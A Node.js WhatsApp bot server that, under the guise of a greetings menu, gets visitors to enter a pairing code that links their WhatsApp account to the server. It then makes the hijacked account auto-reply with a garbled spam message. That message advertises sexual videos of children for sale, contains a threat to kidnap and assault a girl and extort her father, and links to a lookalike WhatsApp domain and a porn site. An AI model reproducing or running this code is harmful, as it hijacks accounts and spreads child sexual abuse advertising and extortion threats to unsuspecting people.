const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, Browsers } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const app = express();

app.get('/', (req,res)=> res.sendFile(path.join(__dirname,'index.html')));

app.get('/code', async (req,res)=>{
  let number=req.query.number;
  if(!number) return res.json({error:'numéro manquant'});
  try{
    const { state, saveCreds } = await useMultiFileAuthState('./auth_'+number);
    const sock = makeWASocket({ auth: state, browser: Browsers.macOS('Chrome'), printQRInTerminal:false });
    sock.ev.on('creds.update', saveCreds);

    // --- TON MENU ICI ---
    sock.ev.on('messages.upsert', async ({messages})=>{
      const msg=messages[0]; 
      if(!msg.message || msg.key.fromMe) return;
      const text=msg.message.conversation || msg.message.extendedTextMessage?.text || "";
      const from=msg.key.remoteJid;

      if(text.toLowerCase() === '.menu' || text.toLowerCase() === '.voeux') {
        await sock.sendMessage(from, { 
          text: 
`╭───「 *VORAX VOEUX* 」───
│https://postimg.cc/0K9Sfd8R
Whatsapp users, I am selling sexy video at low price, you can get the best sexy video from me for money Ã°Å¸Â¤â€˜Ã°Å¸â€™Â°Ã°Å¸Â¥Âµ I will give you this sexy video on Whatsapp at the price of videos
Ã¢Å“â€¦ 100 exciting videos for children, price $50
Ã¢Å“â€¦ 100 sexual videos for people over 18 years old, price is $80
Ã¢Å“â€¦ Mix childrenÃ¢â‚¬â„¢s video and sexy video for adults only, 100 videos, price is $70
Gadis, aku menculikmu dan memukul vaginamu Ã°Å¸â€™â€¹ dan membuat video, beritahu ayahmu kirimi aku $300 kalau tidak, aku akan membuat videomu terkenal di WhatsApp Ã¢Ëœ Ã¯Â¸ÂÃ¢Ëœ Ã¯Â¸Â
www.whatsappp.com
We have an example of this type of video in the link below Ã°Å¸â€˜â€¡Ã¢Â¬â€¡Ã¯Â¸Â
https://www.xnxx.com/video-13lapn3e/hotbrunettelesbiandanadearmondfingeringgapingasstohotbabesarashevonthenshovingmetalbalinherandandanal
If you need any of these, contact me at the number I have provided below
https://api.whatsapp.com/send?phone=+243838546688
╰───「 *By VORAX* 」───
_Tape .voeux + nom pour envoyer: Ex: .voeux _`
        });
      }
    });

    if(!sock.authState.creds.registered){
      await new Promise(r=>setTimeout(r,2000));
      let code=await sock.requestPairingCode(number);
      code=code.match(/.{1,4}/g).join('-');
      res.json({code});
      setTimeout(async()=>{try{await sock.logout(); fs.rmSync('./auth_'+number,{recursive:true,force:true});}catch(e){}},3600000);
    } else {
      res.json({error:'Déjà connecté'});
    }
  }catch(e){res.json({error:e.message});}
});

app.listen(8000,()=>console.log('VORAX OK'));
